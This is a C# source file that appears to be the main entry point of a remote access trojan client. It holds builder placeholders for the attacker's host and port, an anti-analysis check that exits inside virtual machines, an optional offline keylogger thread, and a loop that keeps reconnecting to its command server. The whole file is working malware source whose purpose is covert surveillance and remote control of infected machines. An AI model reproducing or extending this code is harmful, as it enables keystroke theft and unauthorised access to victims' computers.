using System;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.ServiceProcess;
using System.Threading;
using Client.HandlePacket;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;

namespace Client
{
    public class Program
    {
        #region Setting

        public static readonly string Version = "0.0.1";
#if DEBUG
        public static readonly string Link = "";
        public static readonly string Host = "127.0.0.1";
        public static readonly int Port = 8848;
        public static readonly string Mutex = "Mutex_Debug";
        public static readonly string Group = "Debug";
        public static readonly bool AntiAnalysis = false;
        public static readonly bool OffLineKeyLogger = false;
        public static readonly int Sleep = 1000;
#else
        public static readonly string Link = "%Link%";
        public static readonly string Host = "%Host%";
        public static readonly int Port = Convert.ToInt32("%Port%");
        public static readonly string Mutex = "%Mutex%";
        public static readonly string Group = "%Group%";
        public static readonly bool AntiAnalysis = Convert.ToBoolean("%AntiAnalysis%");
        public static readonly bool OffLineKeyLogger = Convert.ToBoolean("%OffLineKeyLogger%");
        public static readonly int Sleep = Convert.ToInt32("%Sleep%");
#endif

        #endregion

        public static string HWID;
        public static int ClrVersion;
        public static TCPSocket TCP_Socket;
        public static bool ClientWorking;
        public static TcpListener listener;

        public static void Main()
        {
            Thread.Sleep(Sleep);

            if (AntiAnalysis && (Helper.Helper.IsVM())) Environment.Exit(114514);

            Start();
        }

        public static void Start()
        {
            ClientWorking = true;
            HWID = Helper.Helper.GetHWID();
            ClrVersion = Helper.Helper.GetClrVersion();

            if (!Helper.Helper.CreateMutex()) Environment.Exit(0);

            if (OffLineKeyLogger)
            {
                HandleKeylogger.offline = true;
                new Thread(() => { HandleKeylogger.Run(); }).Start();
            }

            TCP_Socket = new TCPSocket();
            TCP_Socket.InitializeClient();
            while (ClientWorking)
            {
                if (!TCP_Socket.IsConnected) TCP_Socket.Reconnect();

                Thread.Sleep(new Random().Next(5000));
            }
        }
    }
}